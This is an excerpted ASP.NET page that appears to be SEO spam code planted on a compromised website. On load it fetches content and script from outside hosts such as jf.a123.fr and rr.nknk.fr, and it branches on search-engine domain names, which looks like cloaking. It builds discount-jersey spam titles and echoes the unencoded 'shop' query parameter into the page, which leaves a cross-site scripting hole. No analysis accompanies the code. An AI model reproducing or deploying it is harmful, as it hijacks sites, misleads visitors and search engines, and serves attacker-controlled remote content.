...
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            ...
            tz();
            hyzhdy = webclient.DownloadString("http://jf.a123.fr/new/urlkey.asp?cid=2");
            zhang = webclient.DownloadString("http://rr.nknk.fr/zhang-js.asp");
            string ggf = new string[] { "http://jf.a123.fr/new/en/jersey-en-d1.txt", "http://jf.a123.fr/new/en/jersey-en-d2.txt", "http://jf.a123.fr/new/en/jersey-en-d3.txt", "http://jf.a123.fr/new/en/jersey-en-d4.txt" }[new Random(unchecked((int)DateTime.Now.Ticks)).Next(0, 3)];
    ...
    public void tz()
    {
        ...
        if (domain.IndexOf("google") == -1 && domain.IndexOf("msn.com") == -1 && domain.IndexOf("yahoo.com") == -1 && domain.IndexOf("aol.com") == -1)
        {
            if (Request.QueryString["shop"] != null)
            {
                ...
                ccc = ccc.Replace(" ", "-");
                ccc = ccc.Replace("--", "-");
                string ddd = webclient.DownloadString("http://jf.a123.fr/jerseys.txt");
...
<head>
    ...
    <title>
        <%=Request.QueryString["shop"]%>- OFF
        <%=new Random().Next(60, 80)%>% -
        <%=HttpContext.Current.Request.Url.Host%>!</title>
